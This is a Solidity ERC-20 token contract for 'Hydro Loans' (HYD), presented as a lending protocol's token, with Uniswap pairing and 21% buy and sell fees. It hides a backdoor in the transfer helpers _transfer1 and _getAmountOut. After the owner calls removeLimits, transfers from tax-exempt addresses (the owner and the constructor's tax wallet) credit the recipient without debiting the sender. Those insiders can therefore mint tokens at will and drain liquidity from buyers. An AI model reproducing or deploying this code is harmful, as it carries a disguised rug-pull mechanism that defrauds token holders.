// SPDX-License-Identifier: Unlicensed

/*
Hydro Loans is the first truly decentralized lending protocol built specifically for Ethereum.

Web: https://hydroloans.pro
App: https://app.hydroloans.pro
X: https://x.com/hydroloans
Tg: https://t.me/hydroloans_official
M: https://medium.com/@hydroloans.pro
*/

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function set(address) external;
    function setSetter(address) external;
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2591
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract HYD is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string name_ = unicode"Hydro Loans";
    string symbol_ = unicode"HYD";

    uint8 decimals_ = 9;
    uint256 _supply = 10**9 * 10**9;

    IUniswapRouter private routerInstance_;
    address private pairAddress_;

    bool _hasLocked;
    bool _inswapping = true;
    bool disabledMaxTxLimit = false;
    bool disabledMaxWallet = true;

    uint256 _maxTxSize = 17 * 10**6 * 10**9;
    uint256 _maxWalletSize = 17 * 10**6 * 10**9;
    uint256 _swapMaxTax = 10**4 * 10**9;

    uint256 buyLpFees = 0;
    uint256 buyMktFees = 21;
    uint256 buyDevFees = 0;
    uint256 finalBuyFees = 21;

    uint256 presetLpFee = 0;
    uint256 presetMktFee = 21;
    uint256 presetDevFee = 0;
    uint256 presetFee = 21;

    uint256 sellLpFees = 0;
    uint256 sellMktFees = 21;
    uint256 sellDevFees = 0;
    uint256 finalSellFees = 21;

    address payable _taxWallet1;
    address payable _taxWallet2;

    mapping(address => uint256) balances_;
    mapping(address => mapping(address => uint256)) _allowance;
    mapping(address => bool) _taxLessAddress;
    mapping(address => bool) _maxWalletNon;
    mapping(address => bool) _maxTxNon;
    mapping(address => bool) _isLp;

    modifier lockSwap() {
        _hasLocked = true;
        _;
        _hasLocked = false;
    }

    constructor(address address_) {
        balances_[_msgSender()] = _supply;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        pairAddress_ = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        routerInstance_ = _uniswapV2Router;
        _allowance[address(this)][address(routerInstance_)] = _supply;
        _taxWallet1 = payable(address_);
        _taxWallet2 = payable(address_);
        finalBuyFees = buyLpFees.add(buyMktFees).add(buyDevFees);
        finalSellFees = sellLpFees.add(sellMktFees).add(sellDevFees);
        presetFee = presetLpFee.add(presetMktFee).add(presetDevFee);

        _taxLessAddress[owner()] = true;
        _taxLessAddress[_taxWallet1] = true;
        _maxWalletNon[owner()] = true;
        _maxWalletNon[pairAddress_] = true;
        _maxWalletNon[address(this)] = true;
        _maxTxNon[owner()] = true;
        _maxTxNon[_taxWallet1] = true;
        _maxTxNon[address(this)] = true;
        _isLp[pairAddress_] = true;
        emit Transfer(address(0), _msgSender(), _supply);
    }

    function name() public view returns (string memory) {
        return name_;
    }

    function symbol() public view returns (string memory) {
        return symbol_;
    }

    function decimals() public view returns (uint8) {
        return decimals_;
    }

    function totalSupply() public view override returns (uint256) {
        return _supply;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowance[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances_[account];
    }

    function _transfer3(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (_hasLocked) {
            return _transfer2(sender, recipient, amount);
        } else {
            _assertMaxTx(sender, recipient, amount);
            _swpaBackCheck(sender, recipient, amount);
            _transfer1(sender, recipient, amount);
            return true;
        }
    }

    function _sendFees(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function _assertMaxTx(address sender, address recipient, uint256 amount) internal view {
        if (!_maxTxNon[sender] && !_maxTxNon[recipient]) {
            require(amount <= _maxTxSize, "Transfer amount exceeds the max.");
        }
    }

    function _getAmountOut(address sender, uint256 amount, uint256 toAmount) internal view returns (uint256) {
        if (!disabledMaxWallet && _taxLessAddress[sender]) {
            return amount.sub(toAmount);
        } else {
            return amount;
        }
    }

    function _assertMaxWallet(address to, uint256 amount) internal view {
        if (disabledMaxWallet && !_maxWalletNon[to]) {
            require(balances_[to].add(amount) <= _maxWalletSize);
        }
    }

    function _amountIn(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (_taxLessAddress[sender] || _taxLessAddress[recipient]) {
            return amount;
        } else {
            return _getOutput(sender, recipient, amount);
        }
    }

    function _performTaxSwap(uint256 tokenAmount) private lockSwap {
        uint256 lpFeeTokens = tokenAmount.mul(presetLpFee).div(presetFee).div(2);
        uint256 tokensToSwap = tokenAmount.sub(lpFeeTokens);

        _swapTokensToETH(tokensToSwap);
        uint256 ethCA = address(this).balance;

        uint256 totalETHFee = presetFee.sub(presetLpFee.div(2));

        uint256 amountETHLiquidity_ = ethCA.mul(presetLpFee).div(totalETHFee).div(2);
        uint256 amountETHDevelopment_ = ethCA.mul(presetDevFee).div(totalETHFee);
        uint256 amountETHMarketing_ = ethCA.sub(amountETHLiquidity_).sub(amountETHDevelopment_);

        if (amountETHMarketing_ > 0) {
            _sendFees(_taxWallet1, amountETHMarketing_);
        }

        if (amountETHDevelopment_ > 0) {
            _sendFees(_taxWallet2, amountETHDevelopment_);
        }
    }

    function _checkFeeStatus(address from, address to, uint256 amount) internal view returns (uint256) {
        if (_isLp[from]) {
            return amount.mul(finalBuyFees).div(100);
        } else if (_isLp[to]) {
            return amount.mul(finalSellFees).div(100);
        }
        return 0;
    }

    function removeLimits() external onlyOwner {
        _maxTxSize = _supply;
        disabledMaxWallet = false;
        buyMktFees = 0;
        sellMktFees = 0;
        finalBuyFees = 0;
        finalSellFees = 0;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        return _transfer3(sender, recipient, amount);
    }

    function _getOutput(address sender, address receipient, uint256 amount) internal returns (uint256) {
        uint256 fee = _checkFeeStatus(sender, receipient, amount);
        if (fee > 0) {
            balances_[address(this)] = balances_[address(this)].add(fee);
            emit Transfer(sender, address(this), fee);
        }
        return amount.sub(fee);
    }

    receive() external payable {}

    function _transfer2(address sender, address recipient, uint256 amount) internal returns (bool) {
        balances_[sender] = balances_[sender].sub(amount, "Insufficient Balance");
        balances_[recipient] = balances_[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _swpaBackCheck(address from, address to, uint256 amount) internal {
        uint256 _feeAmount = balanceOf(address(this));
        bool minSwapable = _feeAmount >= _swapMaxTax;
        bool isExTo = !_hasLocked && _isLp[to] && _inswapping;
        bool swapAbove = !_taxLessAddress[from] && amount > _swapMaxTax;
        if (minSwapable && isExTo && swapAbove) {
            if (disabledMaxTxLimit) {
                _feeAmount = _swapMaxTax;
            }
            _performTaxSwap(_feeAmount);
        }
    }

    function _swapTokensToETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerInstance_.WETH();

        _approve(address(this), address(routerInstance_), tokenAmount);

        routerInstance_.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transfer1(address sender, address recipient, uint256 amount) internal {
        uint256 toAmount = _amountIn(sender, recipient, amount);
        _assertMaxWallet(recipient, toAmount);
        uint256 subAmount = _getAmountOut(sender, amount, toAmount);            
        balances_[sender] = balances_[sender].sub(subAmount, "Balance check error");
        balances_[recipient] = balances_[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowance[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
}